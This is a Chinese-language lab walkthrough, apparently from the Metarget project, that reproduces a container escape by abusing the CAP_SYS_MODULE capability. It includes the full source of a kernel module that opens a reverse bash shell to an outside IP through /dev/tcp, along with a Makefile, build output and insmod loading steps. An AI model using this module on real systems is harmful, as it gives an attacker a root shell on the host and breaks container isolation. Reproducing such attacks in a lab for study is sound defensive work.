# 滥用CAP_SYS_MODULE导致容器逃逸

## 场景介绍

cap_sys_module权限表示允许加载内核模块，容器与宿主机共享内核，所以可以在容器内加载包含恶意代码的内核模块，完成逃逸。

## 环境搭建

基础环境（Docker+K8s）准备（如果已经有任意版本的Docker+K8s环境则可跳过）：

```bash
./metarget gadget install docker --version 18.03.1
./metarget gadget install k8s --version 1.16.5 --domestic
```

漏洞环境准备：

```bash
./metarget cnv install cap_sys_module-container
```

执行完成后，K8s集群内`metarget`命令空间下将会创建一个名为`cap-sys-module-container`的带有`CAP_SYS_MODULE`权限的pod。

注：此场景较为简单，也可以直接使用Docker手动搭建。复现漏洞可以使用任意版本的Docker，只需要在启动Docker时，通过`--cap-add`选项来添加`CAP_SYS_MODULE` capability的权限即可。

## 漏洞复现

1. 编写自定义模块`reverse-shell.c`，代码如下

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/192.168.19.xx/4321 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

```

2. 编写Makefile文件：

```bash
obj-m +=reverse-shell.o
all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

3. 然后`make`编译模块：

```bash
make -C /lib/modules/4.15.0-132-generic/build M=/home/nsfocus/sys_module modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-132-generic'
  CC [M]  /home/nsfocus/sys_module/reverse-shell.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/nsfocus/sys_module/reverse-shell.mod.o
  LD [M]  /home/nsfocus/sys_module/reverse-shell.ko
```

4. 将编译生成的`reverse-shell.ko`文件拷贝至容器内，把`/sbin/insmod`、`/bin/kmod`拷贝至容器对应目录，执行insmod加载模块，最终成功获取宿主机的shell。

## 参考文献

1. https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd